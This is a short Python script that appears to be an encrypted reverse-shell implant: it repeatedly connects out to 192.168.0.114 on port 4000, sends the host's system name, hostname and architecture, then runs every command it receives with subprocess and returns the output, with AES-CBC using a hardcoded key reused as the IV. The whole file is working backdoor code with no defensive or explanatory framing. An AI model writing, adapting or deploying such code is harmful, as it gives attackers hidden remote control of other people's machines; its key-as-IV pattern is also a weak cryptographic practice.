from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket, subprocess, os, platform, time

KEY = b'ThisIsA16ByteKey'  # Rotate per session
IV = KEY  # For CBC mode

def encrypt(data): return AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(data.encode(), AES.block_size))
def decrypt(data): return unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(data), AES.block_size).decode()

def fingerprint(): return f"{platform.system()}|{platform.node()}|{platform.machine()}"

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect(("192.168.0.114", 4000))
            s.send(encrypt(fingerprint()))
            while True:
                cmd = decrypt(s.recv(1024))
                if cmd == "exit": break
                out = subprocess.getoutput(cmd)
                s.send(encrypt(out))
        except: time.sleep(10)

connect()
